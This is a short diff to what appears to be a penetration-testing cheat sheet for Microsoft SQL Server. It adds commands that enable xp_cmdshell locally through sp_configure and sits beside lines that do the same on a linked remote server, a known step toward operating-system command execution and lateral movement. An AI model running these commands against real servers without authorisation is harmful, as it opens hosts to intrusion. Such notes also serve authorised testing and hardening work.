@@ -27,6 +27,13 @@ SELECT SYSTEM_USER;
 SELECT @@servername
 ```
 
+## enable xp_cmdshell 
+```
+sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+sp_configure 'xp_cmdshell', 1; RECONFIGURE
+```
+
+# Remote 
 ```
 EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [remote sql]
 EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [remote sql]
